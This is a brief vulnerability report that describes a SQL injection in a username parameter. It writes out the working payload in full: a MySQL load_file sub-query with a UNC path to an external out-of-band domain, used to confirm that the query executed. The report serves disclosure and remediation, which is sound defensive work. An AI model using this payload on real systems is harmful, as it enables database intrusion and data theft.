## Reference: https://portswigger.net/web-security/sql-injection

## Description:
The username parameter appears to be vulnerable to SQL injection
attacks. The payload '+(select
load_file('\\\\im86pxgqgu4kxgnpybjcpvwu1l7ev5qthw5oseg3.mnootupaputkaiisaebeqko.com\\mas'))+'
was submitted in the username parameter. This payload injects a SQL
sub-query that calls MySQL's load_file function with a UNC file path
that references a URL on an external domain. The application
interacted with that domain, indicating that the injected SQL query
was executed. The attacker can steal all information from the database
very easily.

STATUS: HIGH-CRITICAL Vulnerability
